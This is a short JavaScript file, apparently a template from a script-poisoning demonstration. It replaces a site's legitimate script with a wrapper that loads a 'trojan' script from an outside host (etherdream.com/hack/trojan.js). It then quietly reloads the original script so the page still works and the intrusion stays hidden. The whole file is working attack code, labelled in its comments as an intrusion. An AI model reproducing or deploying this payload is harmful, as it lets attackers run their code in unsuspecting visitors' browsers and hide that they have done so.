/**
 * 预加载脚本的内容
 *   @update: 2014/07/10
 */

/** @define {boolean} */
var _DEBUG = true;

(function(runInEval, URL_RAW) {

	// 预加载，不执行
	var poisoning = Math.sin['poisoning'];
	if (poisoning) {
		if (poisoning['map'][URL_RAW]) {
			poisoning['callback'](URL_RAW);
			return;
		}
	}

	var SRC_RAW = URL_RAW + '?1';

	// TROJAN
	var SRC_TROJAN = '//www.etherdream.com/hack/trojan.js';

	function trojan() {
		if (!Math.sin['trojan']) {
			Math.sin['trojan'] = true;
			loadScript(SRC_TROJAN);
		}
	}

	//
	// 本文件内容被 eval 执行
	//   可能使用 AJAX 先加载内容，再调用 eval。
	//   所以尝试用同步的方式，加载执行原始脚本。
	//
	if (runInEval) {
		var xhr = new XMLHttpRequest;
		try {
			xhr.open('GET', SRC_RAW, false);
			xhr.send();
		}
		catch(e) {
			// 无法加载，则用使用后续方案
		}
		return eval(xhr.responseText);
	}

	var doc = document;
	var head = doc.getElementsByTagName('head')[0];

	function loadScript(src) {
		head.appendChild(createScript(src));
	}

	function createScript(src) {
		var s = doc.createElement('script');
		s.src = src;
		return s;
	}

	// 激活入侵脚本
	trojan();

	// 执行当前脚本的元素
	var curEl = doc['currentScript'];
	if (curEl) {
		// 带有延时属性
		if (curEl.async || curEl.defer) {
			curEl.parentNode.replaceChild(createScript(SRC_RAW), curEl);
			return;
		}
		curEl.parentNode.removeChild(curEl);
	}

	if (doc.readyState == 'loading') {
		// 同步加载
		doc.write('<script src=' + SRC_RAW + '></script>');
	}
	else {
		// 异步加载
		loadScript(SRC_RAW);
	}

})(
	// 检测当前是否在 eval 中执行
	typeof arguments != 'undefined',

	// 原始脚本路径
	'$URL_RAW'
);
